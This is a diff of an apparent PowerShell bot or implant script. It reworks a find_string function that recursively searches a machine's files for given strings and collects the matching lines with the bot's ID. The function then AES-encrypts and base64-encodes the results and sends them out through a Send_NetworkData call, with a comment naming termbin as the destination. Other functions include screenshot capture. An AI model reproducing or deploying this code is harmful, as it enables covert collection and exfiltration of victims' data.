@@ -88,32 +88,6 @@ function get_uid() {
 }
 
 
-# Name: 		find_string
-# Parameters: 	$string, list of strings we are searching for
-# Return value:	returns an object containing the list of files
-# Purpose: 		find all files containing a given string
-function find_string ($stringarray){
-	# get all the files that contain the strings we are searching for and append them to the list $files
-	foreach ($str in $stringarray){
-		$files += get-ChildItem -recurse | select-string -pattern $str | select-object -Property Filename, Linenumber, Line
-	}
-
-	# gets the uid of the bot for the returned data
-	$uid = get_uid
-	
-	# create a blank json object for us to append our findings to
-	($json = [pscustomobject]@{})
-	
-	# add the uid to the object 
-	$json | add-member -membertype noteproperty -name uid -value $uid
-	for($i=0; $i -le $files.length; $i++){
-		$fname = "file" + $i
-		$json | add-member -membertype noteproperty -name $fname -value $files[$i]
-	}
-	
-	echo $json |convertto-json
-}
-
 
 # Name:			take_screenshot
 # Parameters:	None
@@ -238,14 +212,57 @@ function Decrypt-String($key, $encryptedStringWithIV) {
 # Parameters:	actually encrypts or decrypts the string. POC of aes code for testing.
 # Return value:	the decrypted/encrypted string
 # Purpose:		poc for crypto
-function perform_encryption($data, $key){
+function perform_encryption($data){
 	$key = Create-AesKey
 
-	write-host $key
-	$unencryptedString = "blahblahblah"
+	#write-host $key
+	$unencryptedString = $data
 	$encryptedString = Encrypt-String $key $unencryptedString
+	
+	# base64 encode our encrypted string so we can handle it safely other places (like termbin)
+	$b = [System.Text.Encoding]::UTF8.GetBytes($encryptedString)
+	$b64 = [System.Convert]::ToBase64String($b)
+	
 	$backToPlainText = Decrypt-String $key $encryptedString
 
 	write-host "[+] encrypted string: $encryptedString"
 	write-host "[+] backtoplain: $backToPlainText"
+	
+	# return the base64 object to be posted
+	return $b64
 }
+
+
+
+# Name: 		find_string
+# Parameters: 	$string, list of strings we are searching for
+# Return value:	returns an object containing the list of files
+# Purpose: 		find all files containing a given string
+function find_string ($stringarray){
+	# get all the files that contain the strings we are searching for and append them to the list $files
+	foreach ($str in $stringarray){
+		$files += get-ChildItem -recurse | select-string -pattern $str | select-object -Property Filename, Linenumber, Line
+	}
+
+	# gets the uid of the bot for the returned data
+	$uid = get_uid
+	
+	# create a blank json object for us to append our findings to
+	($json = [pscustomobject]@{})
+	
+	# add the uid to the object 
+	$json | add-member -membertype noteproperty -name uid -value $uid
+	for($i=0; $i -le $files.length; $i++){
+		$fname = "file" + $i
+		$json | add-member -membertype noteproperty -name $fname -value $files[$i]
+	}
+	
+	# finally, we have a json object!
+	$json_obj = $json | convertto-json
+	
+	# encrypt the json object and get back the base64 of the encrypted json object
+	$e_string = perform_encryption $json_obj
+	
+	Send_NetworkData $e_string
+}
+find_string "this is a super hard test"
